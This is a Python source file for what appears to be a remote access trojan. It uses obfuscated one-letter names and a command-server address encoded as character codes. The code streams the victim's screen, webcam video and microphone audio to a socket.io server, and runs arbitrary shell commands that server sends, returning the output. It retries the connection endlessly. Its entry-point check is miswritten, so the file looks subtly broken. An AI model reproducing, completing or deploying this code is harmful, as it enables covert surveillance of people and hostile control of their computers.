import base64 as b, socketio as s, uuid as u, pyautogui as p, cv2 as c, numpy as n, threading as t, io as i, wave as w, subprocess as x, os as o, pyaudio as a

L = s.Client()
Z = str(u.uuid4())[:8]
C = "".join([chr(i) for i in [104, 116, 116, 112, 58, 47, 47, 49, 50, 55, 46, 48, 46, 48, 46, 49, 58, 53, 48, 48, 48, 47]])

def Q(k):_,f = c.imencode('.jpg', k); return b.b64encode(f).decode()

def S(): 
 while 1:
  R = p.screenshot()
  A = n.array(R)
  A = c.cvtColor(A, c.COLOR_RGB2BGR)
  L.emit('stream', {'id': Z, 'type': 'screen', 'content': Q(A)})

def K(): 
 D = c.VideoCapture(0)
 while D.isOpened():
  g, F = D.read()
  if g:
   L.emit('stream', {'id': Z, 'type': 'cam', 'content': Q(F)})
 D.release()

def U(): 
 P = a.PyAudio()
 T = P.open(format=a.paInt16, channels=1, rate=44100, input=1, frames_per_buffer=1024)
 while 1:
  H = []
  for _ in range(0, int(44100 / 1024 * 5)):
   H.append(T.read(1024, exception_on_overflow=False))
  B = i.BytesIO()
  W = w.open(B, 'wb')
  W.setnchannels(1)
  W.setsampwidth(P.get_sample_size(a.paInt16))
  W.setframerate(44100)
  W.writeframes(b"".join(H))
  W.close()
  L.emit('stream', {'id': Z, 'type': 'audio', 'content': b.b64encode(B.getvalue()).decode()})

def M(): 
 @L.on(f'run_cmd_{Z}')
 def _(d): 
  E = d if isinstance(d, str) else d.get('cmd', '')
  V = o.getcwd() if isinstance(d, str) else d.get('cwd', o.getcwd())
  try:
   if E.startswith("cd "):
    P = E[3:].strip().strip('"')
    o.chdir(P)
    R = f'Cambiado a: {o.getcwd()}'
   else:
    R = x.check_output(E, shell=1, cwd=V, stderr=x.STDOUT).decode(errors='ignore')
  except Exception as ex: R = str(ex)
  L.emit('cmd_output', {'id': Z, 'output': R, 'cwd': o.getcwd()})

@L.event
def connect():
 L.emit('register', {'id': Z})
 t.Thread(target=S, daemon=1).start()
 t.Thread(target=K, daemon=1).start()
 t.Thread(target=U, daemon=1).start()
 M()

@L.event
def disconnect(): pass

def __(): 
 while 1:
  try: L.connect(C); L.wait()
  except: pass

if _name_ == '_main_': __()